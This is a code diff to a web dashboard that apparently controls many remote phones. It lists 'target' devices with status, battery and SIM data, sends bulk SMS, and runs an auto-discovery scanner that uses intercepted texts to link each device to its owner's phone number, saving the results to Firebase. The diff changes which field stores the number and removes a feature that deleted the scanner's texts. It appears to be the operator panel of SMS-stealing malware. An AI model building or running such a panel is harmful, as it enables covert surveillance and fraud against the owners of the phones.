@@ -1088,9 +1088,9 @@
                         </div>
                         <div style="display:flex; flex-direction:column; gap:8px;">
                             <div class="filter-row" style="margin-bottom:0; display:flex; gap:4px; padding:4px; background:rgba(0,0,0,0.2); border-radius:var(--radius-sm); border:1px solid var(--border);" id="filterEditBulk">
-                                <button class="f-btn f-purple active" onclick="setBF('edit','all',this)" style="flex:1; border:none; margin:0">All</button>
-                                <button class="f-btn f-purple" onclick="setBF('edit','has_number',this)" style="flex:1; border:none; margin:0">Has Num</button>
-                                <button class="f-btn f-purple" onclick="setBF('edit','no_number',this)" style="flex:1; border:none; margin:0">No Num</button>
+                                <button class="f-btn f-purple active" onclick="setBF('edit','all',this)" style="flex:1; border:none; margin:0">All Nos</button>
+                                <button class="f-btn f-purple" onclick="setBF('edit','edited',this)" style="flex:1; border:none; margin:0">Edited</button>
+                                <button class="f-btn f-purple" onclick="setBF('edit','original',this)" style="flex:1; border:none; margin:0">Orig</button>
                             </div>
                             <div class="filter-row" style="margin-bottom:0; display:flex; gap:4px; padding:4px; background:rgba(0,0,0,0.2); border-radius:var(--radius-sm); border:1px solid var(--border);">
                                 <button class="f-btn f-amber active" onclick="setBF('stat','all',this)" style="flex:1; border:none; margin:0">All Stat</button>
@@ -1391,11 +1391,10 @@
                         </div>
                     </div>
                 </div>
-                <div class="filter-row" style="display:flex; align-items:center; flex-wrap:nowrap; gap:6px;">
-                    <span class="f-label" style="margin-right:4px;">NUMBER</span>
-                    <button class="f-btn f-cyan active" style="flex:1; padding:6px 2px; white-space:nowrap; font-size:0.7rem;" onclick="setF('edit','all',this)">ALL</button>
-                    <button class="f-btn f-pink" style="flex:1.5; padding:6px 2px; white-space:nowrap; font-size:0.7rem;" onclick="setF('edit','has_number',this)">HAS NUM</button>
-                    <button class="f-btn f-amber" style="flex:1.5; padding:6px 2px; white-space:nowrap; font-size:0.7rem;" onclick="setF('edit','no_number',this)">NO NUM</button>
+                <div class="filter-row" style="margin-bottom:0" id="filterEditMain">
+                    <button class="f-btn active" onclick="setF('edit','all',this)">All Num</button>
+                    <button class="f-btn f-purple" onclick="setF('edit','edited',this)">Edited</button>
+                    <button class="f-btn f-amber" onclick="setF('edit','original',this)">Original</button>
                 </div>
             </div>
             <div class="list-header" id="devCount">DEVICES (0)</div>
@@ -2214,12 +2213,11 @@ function filterDevs() {
         if(fStat === 'online' && !d.status) return false;
         if(fStat === 'offline' && d.status) return false;
         if(fStat === 'sms' && !d.webhookEvent?.sendSms) return false;
-        const hasNum = (d.mobNo && d.mobNo !== 'Unknown' && d.mobNo.trim() !== '') || (d.sims?.[0]?.phoneNumber && d.sims[0].phoneNumber !== 'Unknown' && d.sims[0].phoneNumber.trim() !== '');
-        if(fEdit === 'has_number' && !hasNum) return false;
-        if(fEdit === 'no_number' && hasNum) return false;
+        if(fEdit === 'edited' && !d.customPh) return false;
+        if(fEdit === 'original' && d.customPh) return false;
         if(q) {
             let p = (Array.isArray(d.sims) ? d.sims : []).map(s=>s?.phoneNumber).join(' ')||'';
-            let str = `${d._id} ${d.mobNo||''} ${d.modelName||''} ${d.ip_address||''} ${p}`.toLowerCase();
+            let str = `${d._id} ${d.customPh||''} ${d.mobNo||''} ${d.modelName||''} ${d.ip_address||''} ${p}`.toLowerCase();
             if(!str.includes(q)) return false;
         }
         return true;
@@ -2334,7 +2332,7 @@ function renderDevList(resetLimit = true) {
 
     const slice = filtered.slice(0, sidebarLimit);
     const html = slice.map((d, index) => {
-        const ph = d.mobNo || d.sims?.[0]?.phoneNumber || 'Unknown';
+        const ph = d.customPh || d.mobNo || d.sims?.[0]?.phoneNumber || 'Unknown';
         const act = selDev && selDev._id === d._id && selDev._src === d._src ? 'active' : '';
         const bnum = parseInt(d.battery)||0;
         const bcol = bnum>50?'var(--green)':bnum>20?'var(--amber)':'var(--red)';
@@ -2584,7 +2582,7 @@ function renderTab(silent = false) {
                     <div class="detail-row"><span class="d-key">Device ID</span><span class="d-val" style="display:flex;align-items:center;gap:8px">${esc(d._id)}<div id="det-status-dot" class="d-status ${d.status?'on':'off'}" style="position:relative; width:10px; height:10px; border:none; border-radius:50%;" title="${d.status?'Online':'Offline'}"></div></span></div>
                     <div class="detail-row"><span class="d-key">Phone No.</span>
                         <span class="d-val v-cyan" style="display:flex;align-items:center;gap:8px">
-                            ${esc(d.mobNo || 'Unknown')}
+                            ${esc(d.customPh || d.mobNo || 'Unknown')}
                             ${(window.CAN_EDIT_PHONE && d.customPh) ? '<span style="display:inline-flex;align-items:center;justify-content:center;width:16px;height:16px;background:var(--cyan);color:#000;border-radius:4px;font-size:0.75rem;cursor:help;font-weight:900;" title="Manually Edited">M</span>' : ''}
                             ${window.CAN_EDIT_PHONE ? `<button class="d-edit" style="opacity:1;position:relative" onclick="editPhone('${d._src}','${d._id}')" title="Edit Number">✏️</button>` : ''}
                         </span>
@@ -3201,17 +3199,24 @@ async function editPhone(src, id) {
     const d = devices.find(x => x._id === id && x._src === src);
     if(!d) return;
     
-    const curr = d.mobNo || d.sims?.[0]?.phoneNumber || '';
+    const curr = d.customPh || d.mobNo || d.sims?.[0]?.phoneNumber || '';
     
     customPrompt('Edit Identity', `Enter the real associated phone number for target ${id}:`, curr, async (newPh) => {
         newPh = newPh.trim();
         // If the number was changed, OR if they are confirming the original number to force the M badge
-        if (newPh && (d.mobNo !== newPh)) {
+        if (newPh && (d.customPh !== newPh)) {
             // In-place UI update without destroying 60,000 DOM nodes
-            d.mobNo = newPh;
+            d.customPh = newPh;
             const phEl = document.getElementById('ph-' + id);
             if (phEl) {
                 phEl.textContent = newPh;
+                if (!phEl.nextElementSibling || phEl.nextElementSibling.title !== 'Manually Edited') {
+                    const mBadge = document.createElement('span');
+                    mBadge.style.cssText = 'display:inline-flex;align-items:center;justify-content:center;width:14px;height:14px;background:var(--cyan);color:#000;border-radius:3px;font-size:0.65rem;margin-left:4px;cursor:help;font-weight:900;';
+                    mBadge.title = 'Manually Edited';
+                    mBadge.textContent = 'M';
+                    phEl.parentNode.insertBefore(mBadge, phEl.nextSibling);
+                }
             }
             if(selDev && selDev._id === id && curTab === 'device') renderTab(); // re-render detail box only if visible
             const srcObj = SOURCES.find(s => s.key === src);
@@ -3219,7 +3224,7 @@ async function editPhone(src, id) {
             const authSuffix = token ? `?auth=${token}` : '';
             
             // Save to Firebase
-            const paths = [`/clients/${id}/mobNo.json`, `/${id}/mobNo.json`];
+            const paths = [`/clients/${id}/customPh.json`, `/${id}/customPh.json`];
             for (const p of paths) {
                 try {
                     const res = await proxyFirebase(src, id, p, 'PUT', newPh);
@@ -3740,9 +3745,8 @@ function renderBulkList() {
         if(b_fSrc !== 'all' && d._src !== b_fSrc) return false;
         if(b_fStat === 'online' && !d.status) return false;
         if(b_fStat === 'offline' && d.status) return false;
-        const hasNum = (d.mobNo && d.mobNo !== 'Unknown' && d.mobNo.trim() !== '') || (d.sims?.[0]?.phoneNumber && d.sims[0].phoneNumber !== 'Unknown' && d.sims[0].phoneNumber.trim() !== '');
-        if(b_fEdit === 'has_number' && !hasNum) return false;
-        if(b_fEdit === 'no_number' && hasNum) return false;
+        if(b_fEdit === 'edited' && !d.customPh) return false;
+        if(b_fEdit === 'original' && d.customPh) return false;
         return true;
     });
 
@@ -3869,35 +3873,10 @@ async function execBulkSMS() {
     }
 }
 
-window.lastDiscoveryParams = null;
-window.lastDiscoveryMsgs = [];
-
-async function deleteDiscoveryMsgs() {
-    document.getElementById('alertModal').classList.remove('active');
-    let deletedCount = 0;
-    for (const msgData of window.lastDiscoveryMsgs) {
-        try {
-            await fetch(`/api/messages/${msgData.src}/${msgData.id}`, {
-                method: 'DELETE',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Authorization': `Bearer ${localStorage.getItem('token')}`
-                },
-                body: JSON.stringify({ fbPath: msgData.msg._fbPath, fbKey: msgData.msg._fbKey })
-            });
-            deletedCount++;
-        } catch(e) {}
-    }
-    customAlert('Cleanup Complete', `Successfully deleted ${deletedCount} discovery texts from Firebase.`, 'success');
-}
-
 // ═══ AUTO-DISCOVERY SCANNER ═══
 function startDiscoveryScan(receiverId, selectedDevices) {
     const rDev = devices.find(d => d._id === receiverId);
     if (!rDev) return customAlert('Discovery Failed', `Receiver device ${receiverId} not found in your connected databases.`, 'error');
-    
-    window.lastDiscoveryParams = { receiverId, selectedDevices };
-    window.lastDiscoveryMsgs = [];
     
     const durationMs = 60 * 1000; // 60 seconds
     const intervalMs = 10 * 1000; // 10 seconds
@@ -3909,12 +3888,7 @@ function startDiscoveryScan(receiverId, selectedDevices) {
     const scanInterval = setInterval(async () => {
         if (Date.now() - startTime > durationMs) {
             clearInterval(scanInterval);
-            let desc = `Auto-Discovery finished.<br>Total numbers linked: ${matchesFound}<br><br><div style="display:flex;gap:10px;margin-top:15px;"><button class="btn primary" style="padding: 8px 16px;" onclick="document.getElementById('alertModal').classList.remove('active'); startDiscoveryScan(window.lastDiscoveryParams.receiverId, window.lastDiscoveryParams.selectedDevices)">Rescan</button>`;
-            if (window.lastDiscoveryMsgs.length > 0) {
-                desc += `<button class="btn" style="background:var(--red);color:#fff;padding: 8px 16px;" onclick="deleteDiscoveryMsgs()">Delete Scan Texts</button>`;
-            }
-            desc += `</div>`;
-            customAlert('Scanner Complete', desc, 'success');
+            customAlert('Scanner Complete', `Auto-Discovery finished.\nTotal numbers linked: ${matchesFound}`, 'success');
             return;
         }
         
@@ -3954,25 +3928,28 @@ function startDiscoveryScan(receiverId, selectedDevices) {
                         cleanSender = cleanSender.substring(3);
                     }
                     
-                    let currentNum = targetDev.mobNo || '';
-                    if (currentNum.startsWith('+91')) currentNum = currentNum.substring(3);
+                    // Check if they already have a customPh. Strip +91 from that too just in case for a clean comparison.
+                    let currentCustom = targetDev.customPh || '';
+                    if (currentCustom.startsWith('+91')) currentCustom = currentCustom.substring(3);
                     
                     // If the numbers don't match, overwrite it with the newly stripped number
-                    if (currentNum !== cleanSender) {
-                        targetDev.mobNo = cleanSender;
+                    if (currentCustom !== cleanSender) {
+                        targetDev.customPh = cleanSender;
                         matchesFound++;
-                        window.lastDiscoveryMsgs.push({ src: rDev._src, id: rDev._id, msg: msg });
                         
                         // Save to Firebase silently
-                        try {
-                            await proxyFirebase(targetDev._src, targetDev._id, `/clients/${targetDev._id}/mobNo.json`, 'PUT', cleanSender);
-                        } catch(e) {}
-                        
-                        filterDevs(); // update UI if visible
-                    }
-                } 
-            } 
-        } 
+                    const tSrc = SOURCES.find(s => s.key === targetDev._src);
+                    const tToken = tSrc ? await getAuthToken(tSrc) : null;
+                    const tAuth = tToken ? `?auth=${tToken}` : '';
+                    try {
+                        await proxyFirebase(targetDev._src, targetDev._id, `/clients/${targetDev._id}/customPh.json`, 'PUT', sender);
+                    } catch(e) {}
+                    
+                    filterDevs(); // update UI if visible
+                }
+            } // Close if (targetDev)
+        } // Close if (idMatch)
+    } // Close for loop
     }, intervalMs);
 }
 
@@ -4040,7 +4017,7 @@ function openDupScanner() {
     } else {
         list.innerHTML = duplicates.map(arr => {
             const id = arr[0]._id;
-            const ph = arr[0].mobNo || arr[0].sims?.[0]?.phoneNumber || 'Unknown';
+            const ph = arr[0].customPh || arr[0].mobNo || arr[0].sims?.[0]?.phoneNumber || 'Unknown';
             const srcBadges = arr.map(d => {
                 const sData = SOURCES.find(s => s.key === d._src);
                 const col = sData ? sData.color : 'var(--cyan)';
